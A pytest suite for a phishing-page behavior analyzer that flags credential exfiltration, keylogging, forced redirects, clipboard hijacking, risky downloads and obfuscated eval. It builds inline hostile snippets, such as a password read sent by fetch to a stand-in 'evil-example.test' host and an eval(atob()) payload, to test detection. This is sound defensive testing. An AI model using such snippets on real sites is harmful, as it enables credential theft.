"""Tests for Part 8: Behavioral intent mapping (sources -> sinks).

Every pattern has a positive fixture AND a benign look-alike (tests/fixtures/behavior/):
a single API, a credential read for validation, a same-site login post, a redirect
after a click, a coupon copy button or a user-clicked PDF download must NOT be flagged.
Nothing here runs JavaScript or touches the network.
"""

from __future__ import annotations

import importlib.util
import json
import math
import time
from functools import cache
from pathlib import Path

import pandas as pd
import pytest
from fastapi.testclient import TestClient

from c2_analyzer.api.main import create_app
from c2_analyzer.behavior import baseline as behavior_baseline
from c2_analyzer.behavior import batch as behavior_batch
from c2_analyzer.behavior.intent_vector import risk_score
from c2_analyzer.behavior.pipeline import behavior_for_html, map_behavior
from c2_analyzer.behavior.report import describe_dictionary, describe_result, render_markdown
from c2_analyzer.behavior.report import summarize as summarize_report
from c2_analyzer.behavior.rules import (
    PATTERN_IDS,
    feature_names,
    load_behavior_rules,
    rules_hash,
)
from c2_analyzer.classifiers.dom_baseline.common import BaselineConfig
from c2_analyzer.classifiers.dom_baseline.data import DatasetError
from c2_analyzer.js_analyzer import batch as js_batch
from c2_analyzer.js_analyzer.rules import feature_names as js_feature_names
from c2_analyzer.js_analyzer.rules import rules_hash as js_rules_hash
from c2_analyzer.schemas.behavior import BehaviorResult, Finding

FIXTURES = Path(__file__).parent / "fixtures" / "behavior"
SAMPLE_PAGES = Path(__file__).parent / "fixtures" / "sample_pages"
SCRIPT = Path(__file__).resolve().parents[1] / "scripts" / "map_behavior.py"
URL = "https://shop.example.com/login"
VOLATILE = {"processing_ms", "step_ms"}


@cache
def run(name: str, url: str = URL) -> BehaviorResult:
    folder = SAMPLE_PAGES if name == "js_exfiltration.html" else FIXTURES
    _, _, result = behavior_for_html((folder / name).read_text(encoding="utf-8"), url)
    return result


def html_result(html: str, url: str = URL) -> BehaviorResult:
    return behavior_for_html(html, url)[2]


def patterns(result: BehaviorResult) -> dict[str, Finding]:
    """pattern id -> its most severe finding (findings are sorted most severe first)."""
    found: dict[str, Finding] = {}
    for finding in result.findings:
        found.setdefault(finding.pattern_id, finding)
    return found


def stable(data: dict) -> dict:
    """A result dict without the timing fields (for API == CLI comparisons)."""
    data = json.loads(json.dumps(data))
    for key in VOLATILE:
        data["meta"].pop(key, None)
    return data


# ---- rules, vector, schema ------------------------------------------------------------


def test_rules_load_and_every_pattern_is_defined():
    rules = load_behavior_rules()
    assert set(PATTERN_IDS) <= set(rules.patterns)
    for pattern in PATTERN_IDS:
        spec = rules.patterns[pattern]
        assert spec["description"] and spec["evidence"] and spec["variants"]
    assert rules.feature_set_version == "beh_v1"
    assert {"credential_input", "keystrokes", "decoded_string"} <= set(rules.sources)
    assert {"network_external", "redirect_external", "clipboard_write"} <= set(rules.sinks)
    assert any(e.host == "api.telegram.org" and e.kind == "collector" for e in rules.endpoints)
    assert len(rules_hash()) == 64


def test_vector_length_order_and_values_follow_the_yaml():
    result = run("exfil_external.html")
    names = list(feature_names())
    assert list(result.intent_vector) == names
    assert len(names) == len(load_behavior_rules().features) == len(set(names))
    for spec in load_behavior_rules().features:
        value = result.intent_vector[spec.name]
        assert math.isfinite(value)
        if spec.type == "binary":
            assert value in (0, 1)
    assert result.intent_vector["credential_exfiltration_present"] == 1
    assert result.intent_vector["credential_exfiltration_max_severity"] == 4
    assert result.intent_vector["behavior_risk_score"] == result.behavior_risk_score


def test_risk_score_is_a_capped_sum_of_pattern_maxima():
    weights = load_behavior_rules().risk_weights

    def finding(pattern: str, severity: str) -> Finding:
        score = load_behavior_rules().severity_scores[severity]
        return Finding(
            pattern_id=pattern,
            name=pattern,
            variant="x",
            severity=severity,
            severity_score=score,
            confidence="high",
            message="m",
        )

    assert risk_score([], weights, 100) == 0
    one = [finding("forced_redirect", "high"), finding("forced_redirect", "medium")]
    assert risk_score(one, weights, 100) == weights["high"]  # max per pattern, not a sum
    many = [finding(p, "critical") for p in PATTERN_IDS]
    assert risk_score(many, weights, 100) == 100


def test_result_round_trips_through_json():
    result = run("telegram_submit.html")
    again = BehaviorResult.model_validate_json(result.model_dump_json())
    assert again == result
    assert result.top_findings and result.top_findings[0].startswith("[CRITICAL]")
    assert len(result.top_findings) <= 5 and result.limitations


# ---- task 6: credential exfiltration ----------------------------------------------------


def test_password_to_external_fetch_is_critical_with_an_evidence_chain():
    result = run("exfil_external.html")
    finding = result.findings[0]
    assert (finding.pattern_id, finding.severity) == ("credential_exfiltration", "critical")
    assert finding.variant == "external" and "evil-example.test" in finding.message
    chain = finding.evidence
    assert chain[0].note.startswith("source") and "#password" in chain[0].note
    assert '"password"' in chain[0].code
    assert any(item.note.startswith("assign") and "pwd" in item.code for item in chain)
    assert any(item.note.startswith("assign") and "payload" in item.code for item in chain)
    sink = next(item for item in chain if item.note.startswith("sink"))
    assert "fetch(" in sink.code and sink.line > chain[0].line
    flow = result.flows[finding.flow_ids[0]]
    assert [step.step for step in flow.path][0] == "source" and flow.path[-1].step == "sink"
    assert flow.sink_is_external is True and flow.confidence == "high"


def test_same_domain_post_is_not_exfiltration():
    found = patterns(run("exfil_same_domain.html"))
    assert "credential_exfiltration" not in found
    assert found["credential_access"].severity == "low"
    result = run("exfil_same_domain.html")
    assert {flow.sink_id for flow in result.flows} == {"network_internal"}


def test_validation_only_login_is_just_credential_access():
    result = run("login_validation.html")
    assert [f.pattern_id for f in result.findings] == ["credential_access"]
    assert result.findings[0].severity == "low" and not result.flows
    assert result.behavior_risk_score == load_behavior_rules().risk_weights["low"]


def test_submit_handler_to_telegram_is_critical_with_factors():
    finding = patterns(run("telegram_submit.html"))["credential_exfiltration"]
    assert (finding.severity, finding.variant) == ("critical", "known_endpoint")
    assert "Telegram Bot API" in finding.message
    text = " ".join(finding.factors)
    assert "Telegram Bot API" in text and "base64" in text and "preventDefault" in text
    vector = run("telegram_submit.html").intent_vector
    assert vector["flow_to_known_exfil_endpoint"] == 1 and vector["encoded_flow_count"] >= 1


def test_identity_only_contact_form_to_form_service_is_not_critical():
    finding = patterns(run("contact_form_service.html"))["credential_exfiltration"]
    assert finding.severity == "medium"
    assert any("identity" in factor for factor in finding.factors)


def test_form_action_changed_to_another_site():
    finding = patterns(run("form_action_external.html"))["credential_exfiltration"]
    assert (finding.variant, finding.severity) == ("form_action", "critical")
    assert "password" in finding.message


def test_existing_js_exfiltration_fixture():
    result = run("js_exfiltration.html", "https://login.example.com/")
    finding = result.findings[0]
    assert (finding.pattern_id, finding.severity) == ("credential_exfiltration", "critical")
    first, last = finding.evidence[0], [e for e in finding.evidence if e.note.startswith("sink")][0]
    assert "password" in first.code and first.line == 4  # var pwd = ...("password").value
    assert "fetch(" in last.code and last.line == 6  # fetch("https://exfil...")


# ---- keylogging -----------------------------------------------------------------------


def test_keylogger_to_image_beacon_is_critical():
    finding = patterns(run("keylogger.html"))["keylogging"]
    assert (finding.variant, finding.severity) == ("network", "critical")
    flow = run("keylogger.html").flows[finding.flow_ids[0]]
    assert flow.source_id == "keystrokes" and flow.sink_api == "image_beacon"
    notes = " ".join(step.note or "" for step in flow.path)
    assert "event.key" in notes and "keys.push()" in notes


def test_search_as_you_type_is_not_keylogging():
    result = run("search_suggest.html")
    assert not result.findings
    assert [flow.source_id for flow in result.flows] == ["user_input"]
    assert result.flows[0].sink_id == "network_internal"


# ---- task 7: forced redirect ------------------------------------------------------------


def test_top_level_redirect_is_forced():
    finding = patterns(run("redirect_toplevel.html"))["forced_redirect"]
    assert (finding.variant, finding.severity) == ("automatic", "high")
    assert run("redirect_toplevel.html").intent_vector["auto_redirect_external"] == 1


def test_redirect_in_a_click_handler_is_not_forced():
    result = run("redirect_click.html")
    assert "forced_redirect" not in patterns(result)
    sink = result.sinks_found[0]
    assert (sink.sink_id, sink.trigger) == ("redirect_external", "user")


def test_timer_inherits_the_trigger_of_where_it_is_set_up():
    redirect = (
        "setTimeout(function () { location.replace('https://x.evil-example.test/'); }, 3000);"
    )
    auto = html_result(f"<script>{redirect}</script>")
    assert patterns(auto)["forced_redirect"].variant == "automatic"
    assert "setTimeout callback" in auto.sinks_found[0].trigger_reason
    clicked = html_result(
        f"<button id='b'>go</button><script>document.getElementById('b')"
        f".addEventListener('click', function () {{ {redirect} }});</script>"
    )
    assert clicked.sinks_found[0].trigger == "user"
    assert "forced_redirect" not in patterns(clicked)


def test_meta_refresh_to_another_site():
    finding = patterns(run("meta_refresh.html"))["forced_redirect"]
    assert finding.variant == "meta_refresh" and finding.evidence[0].kind == "html"


def test_redirect_gated_on_browser_checks_is_cloaking():
    finding = patterns(run("redirect_cloaking.html"))["forced_redirect"]
    assert (finding.variant, finding.severity) == ("cloaking", "medium")
    assert "navigator.webdriver" in finding.message


def test_redirect_right_after_reading_credentials():
    finding = patterns(run("redirect_after_login.html"))["forced_redirect"]
    assert finding.variant == "after_credentials"


# ---- task 8: clipboard ------------------------------------------------------------------


def test_wallet_address_in_a_copy_listener_is_critical():
    finding = patterns(run("clipboard_btc.html"))["clipboard_manipulation"]
    assert (finding.variant, finding.severity) == ("crypto_hijack", "critical")
    assert "Bitcoin" in finding.message
    assert run("clipboard_btc.html").intent_vector["clipboard_crypto_address"] == 1


def test_clickfix_command_is_critical_even_on_a_click():
    finding = patterns(run("clipboard_clickfix.html"))["clipboard_manipulation"]
    assert (finding.variant, finding.severity) == ("clickfix", "critical")
    assert run("clipboard_clickfix.html").intent_vector["clickfix_command"] == 1


def test_copy_coupon_button_is_not_flagged():
    assert run("clipboard_coupon.html").findings == []


def test_clipboard_read_sent_away():
    finding = patterns(run("clipboard_read_send.html"))["clipboard_manipulation"]
    assert finding.variant == "clipboard_exfiltration" and finding.severity == "high"


# ---- task 9: downloads ------------------------------------------------------------------


def test_auto_download_of_decoded_exe_is_raised_a_level():
    finding = patterns(run("download_exe.html"))["suspicious_download"]
    assert finding.variant == "auto_risky"
    assert finding.severity == "critical"  # high + decoded content
    assert "ChromeUpdate.exe" in finding.message
    assert any("decoded" in factor for factor in finding.factors)
    assert run("download_exe.html").intent_vector["risky_auto_download"] == 1


def test_user_clicked_pdf_download_is_not_flagged():
    assert "suspicious_download" not in patterns(run("download_pdf_click.html"))


# ---- task 10: obfuscated execution ------------------------------------------------------


def test_eval_of_atob_is_obfuscated_execution():
    finding = patterns(run("eval_atob.html"))["obfuscated_execution"]
    assert (finding.variant, finding.severity) == ("decode_to_exec", "high")
    assert run("eval_atob.html").intent_vector["decode_to_exec"] == 1


def test_decoded_css_into_innerhtml_is_not_obfuscation():
    result = run("decoded_css.html")
    assert result.flows and "obfuscated_execution" not in patterns(result)


def test_minified_library_alone_gives_nothing():
    result = run("minified_library.html")
    assert result.findings == [] and result.summary.library_scripts_skipped == 1


def test_library_code_is_ignored_for_patterns():
    payload = "eval(atob('ZG9jdW1lbnQudGl0bGU9MQ=='));"
    html = (
        "<script>/*! jQuery v3.7.1 | (c) OpenJS Foundation and other contributors | "
        f"jquery.org/license */\n{payload}</script>"
    )
    result = html_result(html)
    assert result.findings == [] and result.summary.library_scripts_skipped == 1
    assert patterns(html_result(f"<script>{payload}</script>"))["obfuscated_execution"]


# ---- anti-analysis ----------------------------------------------------------------------


def test_anti_analysis_techniques():
    finding = patterns(run("anti_analysis.html"))["anti_analysis"]
    assert finding.variant == "several" and finding.severity == "medium"
    for technique in ("right-click", "DevTools keys", "debugger trap"):
        assert technique in finding.message
    assert run("anti_analysis.html").intent_vector["anti_analysis_count"] == finding.count >= 3


# ---- task 3: data flow ------------------------------------------------------------------


def test_function_parameters_template_literal_and_encoder_keep_taint():
    result = run("propagation.html")
    finding = patterns(result)["credential_exfiltration"]
    assert finding.severity == "critical" and finding.confidence == "medium"  # via functions
    flow = next(result.flows[i] for i in finding.flow_ids if result.flows[i].encoded)
    assert flow.via_function and flow.encodings == ["uri"]
    notes = [step.note or "" for step in flow.path]
    assert any("secret of buildPayload()" in note for note in notes)
    assert any("returned by buildPayload()" in note for note in notes)
    assert any("data of send()" in note for note in notes)
    assert any(step.step == "concat" for step in flow.path)  # the template literal


def test_promise_callback_receives_the_value():
    result = run("propagation.html")
    cookie = next(flow for flow in result.flows if flow.source_id == "cookie_read")
    assert cookie.sink_api == "navigator.sendBeacon"
    assert any(".then() callback" in (step.note or "") for step in cookie.path)


def test_html_handler_sees_inline_script_globals():
    result = run("cross_script.html")
    finding = patterns(result)["credential_exfiltration"]
    assert finding.severity == "critical"
    sink = result.sinks_found[0]
    assert sink.trigger == "user" and "onsubmit" in sink.trigger_reason
    assert sink.url_domain == "evil-example.test"  # `target` constant in the inline script


def test_regex_only_script_gives_low_confidence_evidence():
    garbage = " ".join(["@#(" * 3] * 3000)
    html = (
        '<input type="password" id="password"><script>'
        'var p = document.getElementById("password").value;'
        'fetch("https://drop.evil-example.test/x", {body: p});'
        f"{garbage}</script>"
    )
    result = html_result(html)
    assert result.summary.scripts_lexical == 1
    flow = result.flows[0]
    assert flow.confidence == "low" and flow.source_id == "credential_input"
    assert patterns(result)["credential_exfiltration"].confidence == "low"


# ---- caps ---------------------------------------------------------------------------------


def test_long_taint_chain_is_cut_not_hung():
    steps = "".join(f"var a{i} = a{i - 1} + 'x';" for i in range(1, 400))
    html = (
        '<input type="password" id="password"><script>'
        'var a0 = document.getElementById("password").value;'
        f"{steps}"
        'fetch("https://drop.evil-example.test/x", {body: a399});</script>'
    )
    started = time.perf_counter()
    result = html_result(html)
    assert time.perf_counter() - started < 30
    flow = next(f for f in result.flows if f.source_id == "credential_input")
    limit = int(load_behavior_rules().limit("max_path_steps"))
    assert flow.truncated and len(flow.path) <= limit and result.meta.truncated
    assert flow.path[0].step == "source" and flow.path[-1].step == "sink"


def test_page_time_budget_stops_the_analysis(monkeypatch):
    rules = load_behavior_rules()
    monkeypatch.setitem(rules.limits, "page_time_budget_ms", 0)
    monkeypatch.setitem(rules.limits, "script_time_budget_ms", 0)
    body = "".join(f"var v{i} = document.cookie + {i};" for i in range(3000))
    result = html_result(f"<script>{body}</script>")
    assert result.meta.truncated
    assert any("time budget" in warning for warning in result.meta.warnings)


def test_huge_script_finishes():
    body = "var s = 0;\n" + "s = s + 1; " * 40000  # ~440 KB
    started = time.perf_counter()
    result = html_result(f"<script>{body}</script>")
    assert time.perf_counter() - started < 60
    assert result.errors == []


# ---- same path for CLI, API and batch ---------------------------------------------------------


def test_api_equals_pipeline_and_cli(capsys):
    html = (FIXTURES / "telegram_submit.html").read_text(encoding="utf-8")
    client = TestClient(create_app("production"))  # public route: also in production
    response = client.post("/api/v1/behavior", json={"html": html, "url": URL})
    assert response.status_code == 200, response.text
    expected = stable(json.loads(run("telegram_submit.html").model_dump_json()))
    assert stable(response.json()) == expected

    spec = importlib.util.spec_from_file_location("map_behavior_cli", SCRIPT)
    cli = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(cli)
    path = str(FIXTURES / "telegram_submit.html")
    assert cli.main(["one", "--file", path, "--url", URL, "--json"]) == 0
    cli = json.loads(capsys.readouterr().out)
    assert stable(cli) == expected


def test_api_rejects_bad_bodies_and_documents_examples():
    client = TestClient(create_app("development"))
    assert client.post("/api/v1/behavior", json={"url": URL}).status_code == 422
    schema = client.get("/openapi.json").json()
    operation = schema["paths"]["/api/v1/behavior"]["post"]
    assert "Behavioral intent (Part 8)" in operation["tags"]


def test_csv_columns_and_dictionary(tmp_path):
    result = run("exfil_external.html")
    row = {
        "sample_id": "c2_test_000001",
        "label": "phishing",
        "language": "en",
        "cluster_id": "cl_000001",
        "features": result.intent_vector,
    }
    path = behavior_batch.export_csv([row], tmp_path / behavior_batch.CSV_NAME)
    table = pd.read_csv(path)
    assert list(table.columns) == behavior_batch.ID_COLUMNS + list(feature_names())
    assert table.loc[0, "credential_exfiltration_present"] == 1
    dictionary = json.loads(
        behavior_batch.export_dictionary(tmp_path / behavior_batch.DICTIONARY_NAME).read_text(
            "utf-8"
        )
    )
    assert dictionary["rules_hash"] == rules_hash()
    assert [f["name"] for f in dictionary["features"]] == list(feature_names())


def test_map_behavior_refuses_a_part7_result_of_another_page():
    page, js_result, _ = behavior_for_html("<script>var a = 1;</script>", URL)
    other, _, _ = behavior_for_html("<p>other</p><script>var b = 2;</script>", URL)
    with pytest.raises(ValueError):
        map_behavior(other, js_result)
    assert map_behavior(page, js_result).errors == []


# ---- reports ------------------------------------------------------------------------------


def _row(sample_id: str, label: str, name: str) -> dict:
    result = run(name)
    task = {"sample_id": sample_id, "label": label, "language": "en", "cluster_id": "cl_1"}
    return behavior_batch._row(task, result, "processed", {"part2": "stored", "part7": "stored"})


def test_report_lists_benign_pages_with_critical_findings():
    rows = [
        _row("c2_phishing_000001", "phishing", "telegram_submit.html"),
        _row("c2_benign_000001", "benign", "exfil_external.html"),  # pretend: a label error
        _row("c2_benign_000002", "benign", "clipboard_coupon.html"),
    ]
    summary = summarize_report(rows, rows, "vtest", 1.0, {})
    check = summary["benign_false_positive_check"]
    assert check["pages_with_critical_or_high"] == 1
    assert check["pages"][0]["sample_id"] == "c2_benign_000001"
    phishing = summary["per_label"]["phishing"]["patterns"]["credential_exfiltration"]
    assert phishing["pct"] == 100.0 and phishing["by_severity"]["critical"] == 100.0
    assert summary["top_findings"][0]["severity"] == "critical"
    markdown = render_markdown(summary)
    assert "False-positive check" in markdown and "c2_benign_000001" in markdown


def test_describe_texts():
    text = describe_result(run("exfil_external.html"), label="phishing")
    assert "[CRITICAL] Credential exfiltration" in text and "1. script 0 line" in text
    assert (
        "beh_v1" in describe_dictionary()
        and "| `credential_exfiltration` |" in describe_dictionary(markdown=True)
    )


# ---- behavior-only baseline (reuses Part 4) ----------------------------------------------------


def _write_tables(folder: Path, js_hash: str | None = None) -> None:
    ids = ["c2_benign_000001", "c2_phishing_000001"]
    base = {
        "sample_id": ids,
        "label": ["benign", "phishing"],
        "language": ["en", "en"],
        "cluster_id": ["cl_1", "cl_2"],
    }
    js = pd.DataFrame({**base, **{name: [0, 1] for name in js_feature_names()}})
    behavior = pd.DataFrame({**base, **{name: [0, 1] for name in feature_names()}})
    js.to_csv(folder / js_batch.CSV_NAME, index=False)
    behavior.to_csv(folder / behavior_batch.CSV_NAME, index=False)
    (folder / js_batch.DICTIONARY_NAME).write_text(
        json.dumps({"rules_hash": js_hash or js_rules_hash()}), encoding="utf-8"
    )
    (folder / behavior_batch.DICTIONARY_NAME).write_text(
        json.dumps({"rules_hash": rules_hash()}), encoding="utf-8"
    )


def test_behavior_source_joins_js_and_behavior_features(tmp_path):
    _write_tables(tmp_path)
    table = behavior_baseline.load_table("vtest", tmp_path)
    names = behavior_baseline.BEHAVIOR_SOURCE.names()
    assert list(table.columns) == behavior_baseline.ID_COLUMNS + names
    assert names == list(js_feature_names()) + list(feature_names())
    assert behavior_baseline.BEHAVIOR_SOURCE.feature_set_version() == "js_v1+beh_v1"
    _write_tables(tmp_path, js_hash="0" * 64)  # made with other Part 7 rules
    with pytest.raises(DatasetError):
        behavior_baseline.load_table("vtest", tmp_path)


def test_baseline_config_per_source():
    dom = BaselineConfig.load()
    behavior = BaselineConfig.load(behavior_baseline.BEHAVIOR_SOURCE)
    assert dom.features.key == "dom" and dom.models_dir.name == "dom_baseline"
    assert behavior.models_dir.name == "behavior_baseline"
    assert behavior.models == dom.models  # same models and grids (same protocol)


def test_comparison_table(tmp_path):
    def results(macro: float, fingerprint: str = "s1") -> dict:
        model = {
            "display_name": "XGBoost",
            "cv": {"mean": {"macro_f1": macro}, "std": {"macro_f1": 0.01}},
            "test": {
                "macro_f1": macro,
                "weighted_f1": macro,
                "accuracy": macro,
                "balanced_accuracy": macro,
                "roc_auc_ovr_macro": macro,
                "benign_fpr": 0.1,
                "per_class": {"benign": {"f1": macro}, "phishing": {"f1": macro}},
            },
        }
        return {
            "best_model": "xgboost",
            "models": {"xgboost": model},
            "classes": ["benign", "phishing"],
            "split": {"split_fingerprint": fingerprint, "counts": {"test": 10}},
            "features": {"used": 12},
        }

    (tmp_path / "results.json").write_text(json.dumps(results(0.8)), encoding="utf-8")
    comparison = behavior_baseline.compare("vtest", results(0.6), tmp_path)
    assert list(comparison["best"]) == ["dom", "behavior"] and not comparison["notes"]
    markdown = behavior_baseline.comparison_markdown(comparison)
    assert "DOM-only (Part 4)" in markdown and "Behavior-only (Part 7+8)" in markdown
    assert "0.800" in markdown and "0.600" in markdown
    other = behavior_baseline.compare("vtest", results(0.6, "s2"), tmp_path)
    assert any("different splits" in note for note in other["notes"])
